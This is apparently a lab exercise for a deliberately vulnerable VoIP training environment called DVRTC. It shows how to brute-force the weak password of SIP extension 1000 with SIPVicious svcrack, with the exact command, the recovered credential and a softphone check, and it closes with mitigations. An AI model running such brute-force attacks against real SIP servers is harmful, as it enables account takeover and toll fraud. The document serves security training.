# Exercise 4: Online SIP Credential Cracking with svcrack

## Goal

Use SIPVicious OSS `svcrack` to brute-force the weak SIP password for extension `1000` by sending live authentication attempts to DVRTC.

## Prerequisites

- DVRTC running: `docker compose up -d`
- SIPVicious OSS available in the `attacker` service

## Steps

### Step 1: Read the advertised IPv4 from `.env`

Run on the host:

```bash
. ./.env
```

### Step 2: Brute-force extension 1000 online

Run on the host:

```bash
docker compose run --rm attacker sipvicious_svcrack -u 1000 -r 1000-2000 "udp://$PUBLIC_IPV4:5060"
```

Look for `1000` to be reported with password `1500`.

### Step 3: Observe the recovered credential

The expected result in the default DVRTC configuration is:

```text
+-----------+----------+
| Extension | Password |
+===========+==========+
| 1000      | 1500     |
+-----------+----------+
```

### Step 4: Verify the password with a software SIP phone

Run on the host. Use a softphone such as `Zoiper` or `Linphone` and configure it with:

- Username: `1000`
- Password: `1500`
- Domain / SIP server: the Docker host IP, or `127.0.0.1` only if the softphone is running on the same host as DVRTC
- Transport: `UDP`

If the phone registers successfully, the recovered password is correct. You can also place a test call, for example to extension `1200`, to confirm the account works.

## What's happening

`svcrack` performs online password cracking by sending SIP requests that trigger digest authentication and then retrying with candidate passwords until one works. In DVRTC, extension `1000` is intentionally configured with a weak password, so a small numeric range is enough to recover it quickly.

This is different from offline cracking. Every guess in this exercise is sent to the target service in real time, so the attack depends on the server continuing to answer authentication attempts and not enforcing strong rate limits or lockouts.

## Mitigation

- Use strong, non-predictable SIP passwords
- Rate-limit and alert on repeated SIP authentication attempts
- Lock or delay repeated failures for the same account
- Restrict SIP access to trusted networks, VPNs, or an SBC
